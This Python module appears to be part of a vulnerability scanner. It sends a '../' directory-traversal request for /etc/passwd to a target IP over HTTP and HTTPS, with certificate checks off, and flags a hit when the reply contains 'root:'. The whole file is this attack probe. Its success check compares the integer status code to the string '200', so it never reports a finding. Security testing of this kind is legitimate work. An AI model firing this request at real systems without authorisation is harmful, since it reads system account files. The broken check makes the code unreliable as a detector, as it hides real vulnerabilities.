import requests
from lib.color_handler import print_green, print_blue, print_red, print_yellow

def traversal(ip, port=None):
    path = "/../../../../../../../../../../../../../etc/passwd"
    protocols = ["http", "https"]
    ports = [f":{port}" if port else ""]
    for protocol in protocols:
        for port_suffix in ports:
            url = f"{protocol}://{ip}{port_suffix}{path}"
            try:
                response = requests.get(url, timeout=10, verify=False)
                if "root:" in response.text and response.status_code == "200":
                    print_green(f"Directory traversal vulnerability found at: {url}")
                    return True
            except requests.RequestException:
               continue
    return False
